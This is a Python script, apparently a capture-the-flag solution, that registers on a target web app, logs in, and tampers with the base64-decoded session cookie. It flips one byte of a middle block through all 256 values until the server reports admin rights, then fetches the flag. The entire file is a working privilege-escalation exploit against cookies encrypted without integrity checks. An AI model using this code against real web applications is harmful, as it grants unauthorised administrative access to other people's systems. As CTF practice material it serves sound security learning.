from base64 import b64decode, b64encode
from collections import OrderedDict
import json
import requests
import re
import sys

host = ""
port = ""

def register():
    r = requests.post("http://" + host + ":" + port + "/register/",data={'username': 'test','email': 'test@test.test123','password': 'test','confirm':'test','accept_tos':True})
    if r.status_code != 200:
        print "Registartion failed, check script"
        exit()

def login():
    r = requests.post("http://" + host + ":" + port + "/login/",data={'username': 'test','password': 'test'},allow_redirects=False)    
    if r.status_code != 302:
        print "Cannot log in, check script"
    cook = r.headers['Set-Cookie']
    cook = cook.replace("testcookie=","")
    cook = cook.split(";")[0]
    print "Got cookie: " + cook
    return cook

def check_admin(cookie):
    headers = {'Cookie': 'testcookie='+cookie.strip() }
    r = requests.get("http://" + host + ":" + port + "/cookietest/",headers=headers)
    if '"isAdmin": 1' in r.content:
        return True
    return False

def get_flag(cookie):
    headers = {'Cookie' : 'testcookie='+cookie}
    r = requests.get("http://" + host + ":" + port + "/hive/secret/",headers=headers)
    ff = re.compile(r"flag{(.*)}")
    flag = re.findall(ff,r.content)
    print "flag{%s}" % flag[0]
    exit()

def main():
    global host, port
    host = sys.argv[1]
    port = sys.argv[2]
    register()
    cook = login()
    cook = b64decode(cook)
    s = cook[:32]
    m = cook[32:48]
    f = cook[48:]
    for x in range(256):
        z = m[:14] + chr(x) + m[15:]
        n = b64encode(s+z+f)
        if check_admin(n) == True:
            print "You are an admin now!"
            print "Valid cookie: " + n
            get_flag(n)


if __name__ == "__main__":
    main()
